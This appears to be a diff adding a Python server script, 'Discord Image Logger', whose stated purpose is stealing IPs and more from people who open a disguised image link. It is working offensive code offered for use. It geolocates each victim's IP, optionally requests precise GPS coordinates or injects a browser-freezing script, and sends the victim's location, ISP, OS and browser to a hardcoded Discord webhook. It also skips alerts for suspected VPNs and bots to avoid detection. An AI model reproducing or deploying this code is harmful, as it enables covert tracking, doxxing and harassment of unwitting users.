@@ -1,0 +1,304 @@
+# Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
+
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import traceback, requests, base64, httpagentparser
+
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
+
+config = {
+    # BASE CONFIG #
+    "webhook": "https://discord.com/api/webhooks/1118214952772190258/dq-RzBsWa-cv4umwmidh8gdeojNJ-u1Md8nXWd87t3XI_J6McZtRAU-wkmppLQ03zr87",
+    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+
+    # CUSTOMIZATION #
+    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+
+    # OPTIONS #
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
+    },
+
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+                # 0 = No Anti-VPN
+                # 1 = Don't ping when a VPN is suspected
+                # 2 = Don't send an alert when a VPN is suspected
+
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+
+    "antiBot": 1, # Prevents bots from triggering the alert
+                # 0 = No Anti-Bot
+                # 1 = Don't ping when it's possibly a bot
+                # 2 = Don't ping when it's 100% a bot
+                # 3 = Don't send an alert when it's possibly a bot
+                # 4 = Don't send an alert when it's 100% a bot
+    
+
+    # REDIRECTION #
+    "redirect": {
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
+    },
+
+    # Please enter all values in correct format. Otherwise, it may break.
+    # Do not edit anything below this, unless you know what you're doing.
+    # NOTE: Hierarchy tree goes as follows:
+    # 1) Redirect (If this is enabled, disables image and crash browser)
+    # 2) Crash Browser (If this is enabled, disables image)
+    # 3) Message (If this is enabled, disables image)
+    # 4) Image 
+}
+
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+
+def botCheck(ip, useragent):
+    if ip.startswith(("34", "35")):
+        return "Discord"
+    elif useragent.startswith("TelegramBot"):
+        return "Telegram"
+    else:
+        return False
+
+def reportError(error):
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "@everyone",
+    "embeds": [
+        {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
+
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+    if ip.startswith(blacklistedIPs):
+        return
+    
+    bot = botCheck(ip, useragent)
+    
+    if bot:
+        requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "",
+    "embeds": [
+        {
+            "title": "Image Logger - Link Sent",
+            "color": config["color"],
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+        }
+    ],
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+        return
+
+    ping = "@everyone"
+
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    if info["proxy"]:
+        if config["vpnCheck"] == 2:
+                return
+        
+        if config["vpnCheck"] == 1:
+            ping = ""
+    
+    if info["hosting"]:
+        if config["antiBot"] == 4:
+            if info["proxy"]:
+                pass
+            else:
+                return
+
+        if config["antiBot"] == 3:
+                return
+
+        if config["antiBot"] == 2:
+            if info["proxy"]:
+                pass
+            else:
+                ping = ""
+
+        if config["antiBot"] == 1:
+                ping = ""
+
+
+    os, browser = httpagentparser.simple_detect(useragent)
+    
+    embed = {
+    "username": config["username"],
+    "content": ping,
+    "embeds": [
+        {
+            "title": "Image Logger - IP Logged",
+            "color": config["color"],
+            "description": f"""**A User Opened the Original Image!**
+
+**Endpoint:** `{endpoint}`
+            
+**IP Info:**
+> **IP:** `{ip if ip else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+
+**PC Info:**
+> **OS:** `{os}`
+> **Browser:** `{browser}`
+
+**User Agent:**
+```
+{useragent}
+```""",
+    }
+  ],
+}
+    
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
+    return info
+
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+}
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
+    def handleRequest(self):
+        try:
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
+            else:
+                url = config["image"]
+
+            data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
+            
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+                return
+            
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                
+                return
+            
+            else:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                else:
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                
+
+                message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+                datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+
+                if config["redirect"]["redirect"]:
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+                self.wfile.write(data)
+        
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = ImageLoggerAPI
